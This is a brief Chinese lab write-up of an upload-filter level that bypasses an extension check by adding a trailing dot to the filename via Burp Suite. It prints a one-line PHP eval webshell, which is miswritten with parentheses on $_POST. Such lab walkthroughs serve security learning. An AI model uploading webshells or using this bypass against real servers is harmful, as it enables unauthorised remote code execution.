## 解题wp(By:独立团孙德胜Alan)
本pass可以通过增加点的方式绕过，注意，此Pass需要修改PHP环境为5.2.17

## 1.打开第七关

![](./img/1.png)

## 2.上传一个普通的shell.php文件

```
<?php @eval($_POST('Alan'));?>
```

![](./img/2.png)

#### 提示不允许上传

## 3.分析代码

![](./img/3.png)

#### $file_ext = strrchr($file_name, '.');

#### 抓包增加点即可，window系统文件名后缀都会自动过滤点

#### linux环境下也可增加点再上传，linux下不会过滤文件名最后的点

## 4.我们可以使用Burpsutie抓包，利用windows系统特性绕过

![](/img/4.png)

